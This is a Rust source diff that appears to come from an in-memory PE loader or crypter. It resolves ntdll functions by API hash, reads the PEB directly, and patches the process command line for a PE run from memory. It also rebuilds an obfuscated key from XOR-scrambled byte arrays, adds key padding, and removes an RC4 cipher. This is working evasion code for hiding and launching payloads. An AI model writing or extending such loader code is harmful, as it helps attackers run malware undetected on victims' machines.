@@ -1,4 +1,4 @@
-use crate::walker::{get_export_by_hash, get_module_base_by_hash};
+use crate::walker::{current_peb, get_export, get_module_base};
 use core::ffi::c_void;
 use core::ptr::{copy_nonoverlapping, null_mut};
 use ntapi::ntpebteb::PEB;
@@ -14,34 +14,26 @@ pub struct ProcessParametersStore {
 
 pub fn fix_args(store: *mut ProcessParametersStore, in_mem_pe_args: *const i8) {
     unsafe {
-        let ntdll = get_module_base_by_hash(0x1edab0ed);
+        let ntdll = get_module_base(0x55c55c01);
         type NtAlloc =
             extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
-        let nt_alloc: NtAlloc =
-            core::mem::transmute(get_export_by_hash(ntdll, 0xf783b8ec).unwrap());
-
-        let peb: *mut PEB;
-        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        let nt_alloc: NtAlloc = core::mem::transmute(get_export(ntdll, 0x6511db12).unwrap());
+        let peb = current_peb();
         let params = (*peb).ProcessParameters;
-
         (*store).commandline_len_orig = (*params).CommandLine.Length;
         (*store).commandline_max_orig = (*params).CommandLine.MaximumLength;
         (*store).commandline_ptr_orig = (*params).CommandLine.Buffer;
-
         if in_mem_pe_args.is_null() {
             (*params).CommandLine.Length = 0;
             return;
         }
-
         let mut args_len = 0usize;
         while *in_mem_pe_args.add(args_len) != 0 {
             args_len += 1;
         }
-
         let full_path_ptr = (*params).ImagePathName.Buffer;
         let full_path_len = (*params).ImagePathName.Length as usize / 2;
         let mut name_start_idx = 0;
-
         for i in (0..full_path_len).rev() {
             let c = *full_path_ptr.add(i);
             if c == '\\' as u16 || c == '/' as u16 {
@@ -49,31 +41,24 @@ pub fn fix_args(store: *mut ProcessParametersStore, in_mem_pe_args: *const i8) {
                 break;
             }
         }
-
         let exe_name_ptr = full_path_ptr.add(name_start_idx);
         let exe_name_len = full_path_len - name_start_idx;
-
         let new_len_bytes = 2 + (exe_name_len * 2) + 2 + (args_len * 2);
         let alloc_size = new_len_bytes + 2;
-
         let mut new_buf: *mut c_void = null_mut();
         let mut size = alloc_size;
         nt_alloc(-1isize as _, &mut new_buf, 0, &mut size, 0x3000, 0x04);
-
         let wbuf = new_buf as *mut u16;
         core::ptr::write_bytes(new_buf, 0, alloc_size);
-
         *wbuf = '"' as u16;
         copy_nonoverlapping(exe_name_ptr, wbuf.add(1), exe_name_len);
         *wbuf.add(1 + exe_name_len) = '"' as u16;
         *wbuf.add(2 + exe_name_len) = ' ' as u16;
-
         let mut i = 0usize;
         while *in_mem_pe_args.add(i) != 0 {
             *wbuf.add(3 + exe_name_len + i) = *in_mem_pe_args.add(i) as u8 as u16;
             i += 1;
         }
-
         (*params).CommandLine.Buffer = wbuf;
         (*params).CommandLine.Length = new_len_bytes as u16;
         (*params).CommandLine.MaximumLength = alloc_size as u16;
@@ -82,9 +67,9 @@ pub fn fix_args(store: *mut ProcessParametersStore, in_mem_pe_args: *const i8) {
 
 pub fn restore_args(store: *mut ProcessParametersStore) {
     unsafe {
-        let ntdll = get_module_base_by_hash(0x1edab0ed);
+        let ntdll = get_module_base(0x55c55c01);
         type NtFree = extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32) -> i32;
-        let nt_free: NtFree = core::mem::transmute(get_export_by_hash(ntdll, 0x2f0e9f1f).unwrap());
+        let nt_free: NtFree = core::mem::transmute(get_export(ntdll, 0x9d4289b).unwrap());
         let peb: *mut PEB;
         core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
         let params = (*peb).ProcessParameters;
@@ -97,6 +82,19 @@ pub fn restore_args(store: *mut ProcessParametersStore) {
             nt_free(-1isize as _, &mut current_buf, &mut size, 0x8000);
         }
     }
+}
+
+pub fn prepare_32_byte_array(input: &[u8]) -> [u8; 32] {
+    let mut key = [0u8; 32];
+    let bytes = input;
+    for i in 0..32 {
+        if i < bytes.len() {
+            key[i] = bytes[i];
+        } else {
+            key[i] = (i as u8).wrapping_add(0x55);
+        }
+    }
+    key
 }
 
 #[inline(always)]
@@ -129,22 +127,22 @@ fn opaque(x: u8) -> u8 {
     }
 }
 
-pub fn build_string() -> Vec<u8> {
+pub fn key_bytes() -> Vec<u8> {
     let blob: [u8; 25] = [
-        77, 221, 98, 133, 213, 35, 188, 21, 207, 27, 209, 153, 12, 247, 226, 166, 29, 46, 65, 181,
-        38, 135, 67, 218, 246,
+        209, 63, 225, 121, 100, 155, 231, 70, 152, 186, 175, 238, 56, 221, 179, 255, 192, 6, 224,
+        128, 66, 214, 124, 246, 241,
     ];
     let key1: [u8; 25] = [
-        243, 153, 64, 132, 103, 225, 37, 144, 55, 200, 119, 197, 71, 111, 79, 17, 143, 171, 127,
-        144, 165, 51, 231, 31, 81,
+        1, 28, 209, 23, 202, 155, 185, 87, 219, 187, 15, 125, 219, 103, 35, 103, 74, 236, 146, 104,
+        98, 249, 234, 84, 186,
     ];
     let key2: [u8; 25] = [
-        19, 213, 181, 154, 34, 46, 96, 22, 158, 7, 228, 174, 130, 12, 173, 86, 104, 195, 93, 213,
-        7, 85, 245, 198, 32,
+        110, 240, 52, 210, 253, 214, 4, 183, 139, 177, 180, 63, 162, 111, 167, 206, 192, 206, 81,
+        254, 153, 106, 192, 90, 110,
     ];
 
     let mut out = [0u8; 25];
-    let mut state: u8 = 64;
+    let mut state: u8 = 253;
 
     for i in 0..25 {
         let mut v = blob[i];
@@ -160,46 +158,6 @@ pub fn build_string() -> Vec<u8> {
         out[i] = v;
         state = rotl(state ^ v, 1);
     }
+
     out.to_vec()
-}
-
-pub struct State {
-    state: [u8; 256],
-    i: u8,
-    j: u8,
-}
-
-impl State {
-    pub fn new(key: &[u8]) -> Self {
-        let mut rc4 = Self {
-            state: [0; 256],
-            i: 0,
-            j: 0,
-        };
-        for i in 0..256 {
-            rc4.state[i] = i as u8;
-        }
-        let mut j: u8 = 0;
-        for i in 0..256 {
-            j = j
-                .wrapping_add(rc4.state[i])
-                .wrapping_add(key[i % key.len()]);
-            rc4.state.swap(i, j as usize);
-        }
-        rc4
-    }
-
-    pub fn next(&mut self) -> u8 {
-        self.i = self.i.wrapping_add(1);
-        self.j = self.j.wrapping_add(self.state[self.i as usize]);
-        self.state.swap(self.i as usize, self.j as usize);
-        let index = self.state[self.i as usize].wrapping_add(self.state[self.j as usize]);
-        self.state[index as usize]
-    }
-
-    pub fn apply_keystream(&mut self, data: &mut [u8]) {
-        for byte in data.iter_mut() {
-            *byte ^= self.next();
-        }
-    }
 }
